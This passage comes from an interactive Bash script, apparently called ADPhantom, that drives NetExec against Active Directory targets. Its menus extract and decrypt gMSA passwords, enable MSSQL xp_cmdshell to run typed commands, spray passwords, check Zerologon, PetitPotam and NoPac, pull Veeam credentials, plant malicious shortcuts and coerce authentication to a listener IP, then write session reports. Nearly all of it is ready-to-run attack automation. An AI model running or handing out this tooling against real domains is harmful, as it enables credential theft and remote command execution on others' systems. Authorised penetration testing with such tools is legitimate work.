    echo -e "\n${GREEN}=== gMSA Operations (Group Managed Service Accounts) ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for gMSA operations${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select gMSA operation:"
    echo "1) 📋 List all gMSA accounts"
    echo "2) 🔑 Convert gMSA ID to password hash"
    echo "3) 🔓 Decrypt gMSA password from LSA"
    echo "4) 🎯 Extract gMSA passwords (all methods)"
    echo "5) 🔙 Back to main menu"
    read -p "Choice [1-5]: " gmsa_choice
    
    case $gmsa_choice in
        1)
            echo -e "\n${YELLOW}[*] Listing all gMSA accounts:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa
            ;;
        2)
            echo -e "\n${YELLOW}[*] Convert gMSA ID to password hash${NC}"
            read -p "Enter gMSA account ID: " gmsa_id
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_id"
            ;;
        3)
            echo -e "\n${YELLOW}[*] Decrypt gMSA password from LSA${NC}"
            read -p "Enter gMSA account name: " gmsa_account
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_account"
            ;;
        4)
            echo -e "\n${YELLOW}[*] Extracting all gMSA passwords...${NC}"
            
            # First list all gMSA accounts
            echo -e "\n${CYAN}Step 1: Listing gMSA accounts${NC}"
            gmsa_output=$(nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa 2>&1)
            echo "$gmsa_output"
            
            # Extract gMSA IDs and try to convert them
            echo -e "\n${CYAN}Step 2: Attempting to convert gMSA IDs${NC}"
            echo "$gmsa_output" | grep -o "S-[0-9-]\+" | while read -r gmsa_sid; do
                if [ ! -z "$gmsa_sid" ]; then
                    echo -e "\n${YELLOW}[*] Converting SID: $gmsa_sid${NC}"
                    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-convert-id "$gmsa_sid"
                fi
            done
            
            # Try to decrypt from LSA if we have admin rights
            echo -e "\n${CYAN}Step 3: Attempting LSA decryption (requires admin)${NC}"
            echo "$gmsa_output" | grep -i "cn=" | grep -o "CN=[^,]*" | cut -d'=' -f2 | while read -r gmsa_name; do
                if [ ! -z "$gmsa_name" ]; then
                    echo -e "\n${YELLOW}[*] Attempting LSA decryption for: $gmsa_name${NC}"
                    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa-decrypt-lsa "$gmsa_name"
                fi
            done
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run MSSQL enumeration
run_mssql_enum() {
    log_section "MSSQL Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running MSSQL Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for MSSQL enumeration${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "\n${YELLOW}[*] MSSQL Authentication:${NC}"
    nxcrun mssql "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH
    
    echo -e "\n${YELLOW}[*] Try to enable xp_cmdshell and run command:${NC}"
    read -p "Enter command to execute (or press Enter to skip): " cmd
    if [ ! -z "$cmd" ]; then
        nxcrun mssql "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH -x "$cmd"
    fi
    
    read -p "Press Enter to continue..."
}

# Function to run FTP enumeration
run_ftp_enum() {
    log_section "FTP Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running FTP Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for FTP enumeration${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "\n${YELLOW}[*] FTP Directory Listing:${NC}"
    nxcrun ftp "$TARGET" $USER_OPT $AUTH_CRED --ls
    
    read -p "Enter specific directory to list (or press Enter to skip): " ftp_dir
    if [ ! -z "$ftp_dir" ]; then
        nxcrun ftp "$TARGET" $USER_OPT $AUTH_CRED --ls "$ftp_dir"
    fi
    
    read -p "Press Enter to continue..."
}

# Function to run vulnerability checks
run_vuln_check() {
    log_section "Vulnerability Checks | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Vulnerability Checks ===${NC}"
    
    echo "Select vulnerability to check:"
    echo "1) Zerologon"
    echo "2) Petitpotam"
    echo "3) NoPac"
    echo "4) All"
    read -p "Choice [1-4]: " vuln_choice
    
    case $vuln_choice in
        1)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
            ;;
        2)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
            ;;
        3)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
            ;;
        4)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run useful modules
run_modules() {
    log_section "Useful Modules | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Useful Modules ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for modules${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select module:"
    echo "1) Webdav (Check WebClient)"
    echo "2) Veeam (Extract credentials)"
    echo "3) Slinky (Create malicious shortcuts)"
    echo "4) Coerce_plus (Check coercion vulns)"
    echo "5) Enum_AV (Enumerate Antivirus)"
    echo "6) Run all"
    read -p "Choice [1-6]: " module_choice
    
    case $module_choice in
        1)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
            ;;
        2)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
            ;;
        3)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M slinky
            ;;
        4)
            read -p "Enter listener IP (tun0 IP): " listener_ip
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M coerce_plus -o LISTENER=$listener_ip
            ;;
        5)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
            ;;
        6)
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run password spraying
run_spray() {
    log_section "Password Spraying | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Password Spraying ===${NC}"
    
    echo "Password spraying options:"
    echo "1) Single password with userlist"
    echo "2) Password list with userlist"
    read -p "Choice [1-2]: " spray_choice
    
    case $spray_choice in
        1)
            read -p "Enter path to userlist file: " userlist
            read -p "Enter password to spray: " spray_pass
            nxcrun smb "$TARGET" -u "$userlist" -p "$spray_pass" $DOMAIN_OPTION --continue-on-success
            ;;
        2)
            read -p "Enter path to userlist file: " userlist
            read -p "Enter path to password list: " passlist
            nxcrun smb "$TARGET" -u "$userlist" -p "$passlist" $DOMAIN_OPTION --no-bruteforce --continue-on-success
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run all enumeration
run_all() {
    echo -e "\n${GREEN}=== Running All Enumeration ===${NC}"
    echo -e "${RED}[!] This will take a very long time...${NC}"
    echo -e "${YELLOW}[!] Make sure you have proper authorization${NC}"
    
    run_auth
    run_basic_enum
    
    if [ "$USERNAME" != "''" ]; then
        run_smb_enum
        run_ldap_enum
        run_cred_dump_advanced
        run_vuln_check
        run_modules
        run_gmsa_ops
        run_advanced_ldap
        run_mapping_enum
        run_hash_check
    fi
    
    echo -e "\n${GREEN}[+] All enumeration completed!${NC}"
    read -p "Press Enter to continue..."
}

# Function to change target/credentials
change_settings() {
    get_target
    get_credentials
}

# Generate TXT and HTML reports from session log
generate_report() {
    local end_time
    end_time=$(date '+%Y-%m-%d %H:%M:%S')
    local start_time
    start_time=$(grep "SESSION_START=" "$LOG_FILE" | cut -d= -f2)
    local cmd_count
    cmd_count=$(grep -c "^\[.*\] CMD:" "$LOG_FILE" 2>/dev/null || echo 0)

    echo -e "\n${CYAN}[*] Generating reports...${NC}"

    # ── TXT Report ──────────────────────────────────────────────
    {
        echo "========================================================"
        echo "  ADPhantom — Session Report"
        echo "========================================================"
        echo "  Target   : $TARGET"
        echo "  Username : $USERNAME"
        echo "  Domain   : ${DOMAIN:-Not set}"
        echo "  Start    : $start_time"
        echo "  End      : $end_time"
        echo "  Commands : $cmd_count"
        echo "  Log file : $LOG_FILE"
        echo "========================================================"
        echo ""
        # Print each command block
        while IFS= read -r line; do
            if [[ "$line" =~ ^\[.*\]\ CMD: ]]; then
                echo ""
                echo "──────────────────────────────────────────────────────"
                echo "  $line"
                echo "──────────────────────────────────────────────────────"
            elif [[ "$line" =~ ^════ ]]; then
                echo ""
                echo "$line"
            else
                echo "$line"
            fi
        done < <(grep -v "^SESSION_START\|^HOSTNAME\|^USER_RUNNING" "$LOG_FILE")
        echo ""
        echo "========================================================"
        echo "  End of Report"
        echo "========================================================"
    } > "$REPORT_TXT"

    # ── HTML Report ──────────────────────────────────────────────
    {
        cat <<HTMLEOF
<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<title>ADPhantom Report — $TARGET</title>
<style>
  :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--accent:#58a6ff;
        --green:#3fb950;--yellow:#d29922;--red:#f85149;--cyan:#39c5cf;
        --text:#c9d1d9;--muted:#8b949e;}
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:var(--bg);color:var(--text);font-family:'Cascadia Code','Fira Code',monospace;
       font-size:13px;line-height:1.6;padding:24px}
  header{background:var(--surface);border:1px solid var(--border);border-radius:8px;
         padding:24px 28px;margin-bottom:20px}
  header h1{font-size:22px;color:var(--accent);margin-bottom:6px}
  .meta{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin-top:12px}
  .meta-item{background:#21262d;border-radius:6px;padding:8px 12px;font-size:12px}
  .meta-item span{color:var(--muted);display:block;font-size:10px;text-transform:uppercase;
                  letter-spacing:.5px;margin-bottom:2px}
  .section{background:var(--surface);border:1px solid var(--border);border-radius:8px;
           margin-bottom:12px;overflow:hidden}
  .section-header{background:#21262d;padding:8px 16px;font-size:11px;
                  color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:.5px}
  .cmd-block{border-bottom:1px solid var(--border);padding:10px 16px}
  .cmd-block:last-child{border-bottom:none}
  .cmd-line{color:var(--yellow);font-weight:600;margin-bottom:6px;font-size:12px}
  .cmd-line::before{content:"$ ";color:var(--green)}
  .output{color:var(--text);white-space:pre-wrap;word-break:break-all;
          font-size:11.5px;padding-left:16px;border-left:2px solid var(--border)}
  .no-output{color:var(--muted);font-size:11px;padding-left:16px;font-style:italic}
  footer{margin-top:20px;text-align:center;color:var(--muted);font-size:11px}
</style>
</head>
<body>
<header>
  <h1>ADPhantom — Session Report</h1>
  <div class="meta">
    <div class="meta-item"><span>Target</span>$TARGET</div>
    <div class="meta-item"><span>Username</span>${USERNAME}</div>
    <div class="meta-item"><span>Domain</span>${DOMAIN:-Not set}</div>
    <div class="meta-item"><span>Start</span>$start_time</div>
    <div class="meta-item"><span>End</span>$end_time</div>
    <div class="meta-item"><span>Commands Run</span>$cmd_count</div>
  </div>
</header>
HTMLEOF

        # Parse log into HTML sections
        current_section=""
        in_cmd=0
        cmd_text=""
        output_lines=()

        flush_cmd() {
            if [ -n "$cmd_text" ]; then
                echo '<div class="cmd-block">'
                echo "<div class=\"cmd-line\">$(printf '%s' "$cmd_text" | sed 's/.*CMD: //' | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
                if [ ${#output_lines[@]} -gt 0 ]; then
                    echo '<div class="output">'
                    for ol in "${output_lines[@]}"; do
                        printf '%s\n' "$ol" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g'
                    done
                    echo '</div>'
                else
                    echo '<div class="no-output">(no output captured)</div>'
                fi
                echo '</div>'
                cmd_text=""
                output_lines=()
            fi
        }

        while IFS= read -r line; do
            if [[ "$line" =~ ^SESSION_START|^HOSTNAME|^USER_RUNNING ]]; then
                continue
            elif [[ "$line" =~ ^════ ]]; then
                continue
            elif [[ "$line" =~ ^\ \ (.+)\ \|\ Target ]]; then
                flush_cmd
                if [ -n "$current_section" ]; then echo '</div>'; fi
                section_name="${BASH_REMATCH[1]}"
                current_section="$section_name"
                echo '<div class="section">'
                echo "<div class=\"section-header\">$section_name</div>"
            elif [[ "$line" =~ ^\[.*\]\ CMD:\ (.*) ]]; then
                flush_cmd
                cmd_text="$line"
            elif [ -n "$cmd_text" ]; then
                output_lines+=("$line")
            fi
        done < "$LOG_FILE"

        flush_cmd
        if [ -n "$current_section" ]; then echo '</div>'; fi

        echo '<footer>ADPhantom v4.0 &mdash; Report generated '"$end_time"'</footer>'
        echo '</body></html>'
    } > "$REPORT_HTML"

    echo -e "${GREEN}[+] Reports saved:${NC}"
    echo -e "    TXT  : ${CYAN}$REPORT_TXT${NC}"
    echo -e "    HTML : ${CYAN}$REPORT_HTML${NC}"
    echo -e "    LOG  : ${CYAN}$LOG_FILE${NC}"
}

# Main loop
while true; do
    print_banner
    
    # Check if target is set
    if [ -z "$TARGET" ]; then
        get_target
        get_credentials
    fi
    
    show_menu
    
    case $choice in
        1) run_auth ;;
        2) run_basic_enum ;;
        3) run_smb_enum ;;
        4) run_ldap_enum ;;
        5) run_mssql_enum ;;
        6) run_ftp_enum ;;
        7) run_cred_dump_advanced ;;
        8) run_vuln_check ;;
        9) run_modules ;;
        10) run_spray ;;
        11) run_mapping_enum ;;
        12) run_all ;;
        13) change_settings ;;
        14) run_gmsa_ops ;;
        15) run_advanced_ldap ;;
        16) run_hash_check ;;
        0)
            generate_report
            echo -e "${GREEN}Goodbye!${NC}"
            exit 0
            ;;
        *) 
            echo -e "${RED}Invalid option${NC}"
            sleep 1
            ;;
    esac
done